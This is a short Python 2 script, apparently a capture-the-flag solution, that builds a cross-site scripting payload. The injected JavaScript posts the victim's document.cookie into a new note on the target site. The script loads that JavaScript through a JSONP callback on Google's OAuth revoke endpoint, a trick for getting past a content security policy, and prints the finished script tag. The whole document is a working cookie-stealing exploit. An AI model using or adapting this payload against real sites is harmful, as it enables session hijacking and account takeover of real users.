import urllib

js_payload = """$.post('/note/new',{title: "cookie sponsored", content: document.cookie});"""
js_payload_quoted = urllib.pathname2url(js_payload)

json_endpoint = "https://accounts.google.com/o/oauth2/revoke?callback="

xss_payload = "<script src=%s%s></script>" % (json_endpoint, js_payload_quoted)

print xss_payload
